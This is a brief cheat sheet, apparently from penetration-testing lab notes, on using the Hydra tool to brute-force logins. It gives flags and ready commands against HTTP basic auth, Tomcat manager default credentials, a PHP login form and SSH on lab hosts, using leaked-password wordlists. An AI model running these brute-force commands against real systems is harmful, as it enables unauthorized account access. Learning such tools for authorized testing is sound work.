# hydra

## Overview

Hydra is a handy tool for Login Brute Forcing, as it covers a wide variety of attacks and services and is relatively fast compared to the others. It can test any pair of credentials and verify whether they are successful or not but in huge numbers and a very quick manner.

## Installation

	apt install hydra

## Options

	-U : shows the parameters required by an hydra module
	-C <path_to_wordlist>: Combined credentials wordlist
	-L <path_to_username_wordlist> : username wordlist
	-l <username> : specify a static username to use
	-P <path_to_passoword_wordlist> : password wordlist
	-p <password> : specify a static password to use
	-s <port>: target port
	-f : tell hydra to stop when we have a successfull brute force
	-u: tells hydra to first try all users for each password. Instead of the normal behaviour of trying all passwords for each user. This is usefull for gigantic password lists like rockyou
	http-get : Get request method
	/ : Target url path

## Usage

	hydra -C <path_to_wordlist> <server_ip> -s <port> http-get /

Using different wordlists

```shell
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```

Default Login popup on a webserver

```shell
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt <ip_target> -s 8080 http-get /manager/
```

Password Spray on a regular webapp

```shell
#Invalid Credentials! is the error message the webapp show when a login attempt fails
hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
```

Bruteforce ssh

```shell
hydra -L users.txt -P passwords.txt ssh://editorial.htb
```

